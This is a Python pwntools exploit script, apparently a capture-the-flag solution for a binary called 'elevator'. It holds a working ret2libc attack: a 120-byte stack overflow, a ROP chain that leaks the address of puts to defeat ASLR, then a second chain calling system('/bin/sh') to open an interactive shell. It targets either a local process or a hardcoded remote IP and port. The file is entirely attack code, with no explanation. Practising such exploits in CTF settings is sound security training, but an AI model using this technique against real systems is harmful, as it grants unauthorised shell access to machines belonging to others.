#!/usr/bin/env python3

from pwn import *

exe = ELF("./elevator_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.log_level = 'debug'
context.terminal = 'kitty'

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("175.41.165.218", 5555)

    return r


def main():
    r = conn()
    # gdb.attach(r, gdbscript="break fgets")

    rop = ROP(exe)

    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

    rop.raw(b'A' * 120)
    rop.raw(pop_rdi)
    rop.raw(exe.got.puts)
    rop.raw(exe.plt.puts)
    rop.raw(exe.sym.main)

    r.sendlineafter('>>', rop.chain())

    r.recvuntil('experience!\n')
    libc.address = u64(r.recvline().strip(b'\n').ljust(8, b'\x00')) - libc.sym.puts
    log.info("libc, %#x", libc.address)

    rop2 = ROP(libc)
    rop2.raw(b'A' * 120)
    rop2.raw(rop2.find_gadget(['pop rdi', 'ret'])[0])
    rop2.raw(next(libc.search(b'/bin/sh\x00')))
    rop2.raw(rop2.find_gadget(['ret'])[0])
    rop2.raw(libc.sym.system)

    print(rop2.dump())

    r.clean()

    r.sendline(rop2.chain())

    r.interactive()

if __name__ == "__main__":
    main()
